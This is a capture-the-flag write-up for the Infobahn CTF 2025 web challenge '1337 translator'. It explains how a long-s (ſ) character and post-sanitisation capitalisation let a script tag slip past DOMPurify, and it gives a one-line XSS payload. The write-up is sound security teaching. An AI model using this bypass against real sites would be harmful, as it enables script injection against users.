# 1337 translator

|              |                                                                                             |
| ------------ | ------------------------------------------------------------------------------------------- |
| **CTF**      | [Infobahn CTF 2025](http://2025.infobahnc.tf/) [(CTFtime)](https://ctftime.org/event/2878/) |
| **Author**   | [bawolff](https://blog.bawolff.net)                                                         |
| **Category** | web                                                                                         |
| **Solves**   | 1                                                                                           |
| **Files**    | [chall.zip](./chall.zip)                                                                    |

# Solution

See [solve.py](./solve.py) script, but essentially do something like `<b><style> <ſcript src="URL_HERE"></style><div title="</ſcript>"` being sure to encode the URL with entity references to avoid replacements.

`<style>` tags are considered raw text elements, so nothing inside is interpreted as HTML.

However the replacements replace the style tag with a different tag, causing the insides to be treated
as html again.

As a hardening measure, DOMPurify doesn't allow anything that looks like HTML inside a style tag. However it considers `<ſ` to be fine. ſ is an archaic form of the lowercase "s" and thus turns into S when capitalized. This allows us to bypass DOMPurify's hardening as the challenge capitalizes after DOMPurify purifies.

Last of all we need need to close the script tag, which we do inside an attribute.
